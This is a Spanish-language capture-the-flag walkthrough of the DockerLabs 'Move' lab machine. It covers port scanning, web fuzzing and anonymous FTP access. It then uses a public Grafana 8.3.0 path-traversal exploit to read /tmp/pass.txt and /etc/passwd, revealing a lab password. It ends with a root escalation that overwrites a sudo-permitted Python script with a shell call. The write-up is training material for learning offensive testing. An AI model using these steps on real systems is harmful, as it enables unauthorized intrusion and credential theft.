# 📘 Informe Técnico - Máquina: *Move*

* **Nivel:** Fácil
* **Propósito:** 
* **Objetivo:** 
---

![Logo](Imágenes/2025-05-15_16-55.png)

## 🛠️ Despliegue de la Máquina

Iniciamos descargando el archivo comprimido desde DockerLabs. Luego lo descomprimimos con:

```bash
unzip move.zip
```

Posteriormente, desplegamos la máquina vulnerable usando el siguiente comando:

```bash
sudo bash auto_deploy.sh move.tar
```

![Desplegar](Imágenes/Capturas.png)


Verificamos que la máquina esté activa con un `ping` al contenedor:

```bash
ping -c1 172.17.0.3
```

![Ping](Imágenes/Capturas_1.png)

---

## 🔎 Reconocimiento

Realizamos un escaneo de puertos completo con `nmap`:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
```

![Nmap Puertos](Imágenes/Capturas_2.png)

Luego usamos `extractPorts` para filtrar los puertos detectados y escaneamos con más detalle:

```bash
nmap -sCV -p80,22,21 172.17.0.3 -oG target.txt
```

![Nmap detallado](Imágenes/Capturas_3.png)

### 🔍 Resultado:

* **Puerto 80**: Servicio HTTP activo (servidor web).

* **Puerto 22**: Servicio SSH activo (servicio SSH).

* **Puerto 21**: Servicio FTP activo (servicio FTP con el usuario Anonymous).
Nota: Podemos entrar al servico FTP sin necesidad de tener credenciales porque esta activo el usuario Anonymous.
---

Entramos http://172.17.0.3/ para ver el servico web y es la pagina defaul de apache2.

![Pagina](Imágenes/Capturas_4.png)

Realice fuzzin con gobuster dir -u http://172.17.0.3/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -add-slash -b 403,404 -x php,html,txt

![Fuzzing](Imágenes/Capturas_5.png)

Y se encotro http://172.17.0.3/maintenance.html donde se encontro una ruta /tmp/pass.txt

![Fuzzing](Imágenes/Capturas_6.png)

Entramos al servicio de FTP con el usuario Anonymous y al pedrnos contraseña le damos enter
![Fuzzing](Imágenes/Capturas_7.png)

Con ls -la vemos los directorios que hay encontrmos mantenimiento nos movemos con cd mantenimiento y ls -la para verlo sus directorios y encontramos database.kdbx lo descargamos con: get database.kdbx
![Fuzzing](Imágenes/Capturas_8.png)

Despues estube probando puertos que podrian estar abierto y encontre el puerto 3000
![Open](Imágenes/Capturas_9.png)

al entrar en la direccion http://172.17.0.3:3000/login nos da una pagina para registranos en grafana y en la parte inferior izquierda podemos notar que esta desactualizado y nos muestra que estamos en la version v8.3.0 (914fcedb7)
![Registro](Imágenes/Capturas_10.png)

con el comando: searchsploit Grafana 8.3.0 buscamos algiua vulnerabilidad y encotramos la vulnerabilidad  multiple/webapps/50581.py lo descagamos con searchsploit -m multiple/webapps/50581.py y lo ejecutamos con:
python3 50581.py -H http://172.17.0.3:3000 nos habre una terminal y ejecutamos un /tmp/pass.txt con la ruta encontrada en uno de los directorios y encontramos una contraseña: t9sH76gpQ82UFeZ3GXZS
![contraseña](Imágenes/Capturas_11.png)

Ahora con una contraseña necesitamos un usuario ejecutamos /etc/passwd para buscar usuarios y encontramos:freddy
![Usuarios](Imágenes/Capturas_12.png)


Entre al servicio ftp con estas credenciales y en cd /opt encotre maintenance.py lom descargue con get maintenance.py contenia un print("Server under beta testing") 
![py](Imágenes/Capturas_13.png)

Entre con las credenciales encontradas y ejecute sudo -l que me dio la ubicacion de un script con permisos     (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py accedi a eñ con cd /opt/ lo elimine rm maintenance.py crre un archivo:
echo 'import os; os.system("/bin/bash")' > /opt/maintenance.py le di privilegios chmod +x /opt/maintenance.py  y lo ejecute sudo /usr/bin/python3 /opt/maintenance.py y accedi a root
![root](Imágenes/Capturas_13.png)

Nota probablemete exita otro metodo de resolverlo por datos que recopile.















